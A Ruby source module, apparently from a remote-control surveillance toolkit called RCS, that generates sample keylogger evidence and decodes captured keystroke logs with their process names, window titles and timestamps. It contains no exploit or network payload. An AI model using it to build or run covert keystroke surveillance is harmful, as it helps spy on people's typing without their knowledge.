# encoding: utf-8

require 'rcs-common/evidence/common'

module RCS

module KeylogEvidence
=begin
int tm_sec;
int tm_min;
int tm_hour;
int tm_mday;
int tm_mon;
int tm_year;
int tm_wday;
int tm_yday;
int tm_isdst;
=end
  
  ELEM_DELIMITER = 0xABADC0DE
  KEYSTROKES = ["привет мир\0", "こんにちは世界\0", "Hello world!\0", "Ciao mondo!\0"]
  
  def content
    proc_name = "ruby\0".to_utf16le_binary
    window_name = "Ruby Backdoor!\0".to_utf16le_binary
    content = StringIO.new
    t = Time.now
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write proc_name
    content.write window_name
    content.write [ ELEM_DELIMITER ].pack('L*')
    chosen = KEYSTROKES.sample
    keystrokes = chosen.to_utf16le_binary
    content.write keystrokes
    content.string
  end
  
  def generate_content
    ret = Array.new
    # insert first two bytes to null terminate the string
	  ret << [0].pack('S') + content()
    (rand(9)).times { ret << content() }
    ret
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join
    stream.read 2 # first 2 bytes of null termination (Naga weirdness ...)
    
    evidences = Array.new
    until stream.eof?
      tm = stream.read 36
      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
      @info[:process_name] = ''
      @info[:window_name] = ''
      @info[:keystrokes] = ''
      
      process_name = stream.read_utf16_string
      @info[:process_name] = process_name.utf16le_to_utf8 unless process_name.nil?
      window_name = stream.read_utf16_string
      @info[:window_name] = window_name.utf16le_to_utf8 unless window_name.nil?
      
      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("malformed evidence") unless delim == ELEM_DELIMITER
      
      keystrokes = stream.read_utf16_string
      @info[:keystrokes] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
      
      # this is not the real clone! redefined clone ...
      evidences << self.clone
    end
    
    return evidences
  end
end

end # ::RCS